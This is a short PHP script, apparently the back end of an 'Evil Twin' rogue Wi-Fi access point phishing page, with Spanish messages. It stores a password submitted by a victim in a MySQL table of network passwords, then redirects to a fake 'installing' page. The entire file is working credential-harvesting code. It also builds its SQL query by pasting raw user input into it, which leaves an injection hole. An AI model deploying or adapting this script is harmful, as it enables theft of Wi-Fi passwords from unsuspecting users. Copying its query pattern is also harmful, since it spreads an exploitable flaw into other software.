<?php 

$con = new mysqli("localhost", "wpa_admin", "admin", "EvilTwin");

if($con->connect_error) {
    die("ERROR: No se pudo establecer una conexión con la base de datos: " . $con->connect_error);
}

echo "Espere un momento...";

if (isset($_POST['password']) && isset($_POST['password_check'])) {
    $password1 = $_POST['password'];
    $password2 = $_POST['password_check'];

    $sql = "INSERT INTO redes (`password`) VALUES ('$password1')";

    if ($con->query($sql) === TRUE) {
        header('Location: instalando.html');
        die();
    } else {
        echo 'ERROR: ' . $con->error; 
    }

} else {
    echo "ERROR: Hay parametros faltantes";
    echo 'Por favor vuelve <a href="index.php">AQUÍ</a> para solucionar los problemas.';
}


$con->close();

?> 